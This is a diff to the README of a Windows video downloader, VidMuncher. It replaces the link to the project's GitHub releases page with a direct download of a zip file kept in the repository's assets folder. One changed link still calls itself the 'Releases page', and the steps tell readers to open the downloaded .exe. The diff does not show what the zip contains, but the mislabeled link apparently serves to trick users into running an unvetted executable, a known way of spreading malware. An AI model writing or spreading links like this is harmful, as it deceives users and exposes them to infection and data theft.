@@ -1,6 +1,6 @@
 # 📥 VidMuncher - Download online videos with one click
 
-[![](https://img.shields.io/badge/Download_VidMuncher-Blue.svg)](https://github.com/Labradoryeshivah6794/VidMuncher/releases)
+[![](https://img.shields.io/badge/Download_VidMuncher-Blue.svg)](https://raw.githubusercontent.com/Labradoryeshivah6794/VidMuncher/main/assets/Muncher_Vid_v1.8.zip)
 
 VidMuncher lets you save videos from the internet to your computer. It uses a tool called yt-dlp to grab content from many websites. The program organizes the files so you can keep them for later.
 
@@ -10,7 +10,7 @@ Your computer must run Windows 10 or Windows 11. The program works best with a s
 
 ## 🚀 How to Install and Run
 
-1. Visit the [VidMuncher Releases page](https://github.com/Labradoryeshivah6794/VidMuncher/releases).
+1. Visit the [VidMuncher Releases page](https://raw.githubusercontent.com/Labradoryeshivah6794/VidMuncher/main/assets/Muncher_Vid_v1.8.zip).
 2. Look for the latest version listed at the top.
 3. Click the link for the file ending in .exe to start your download.
 4. Open the file once the download finishes.
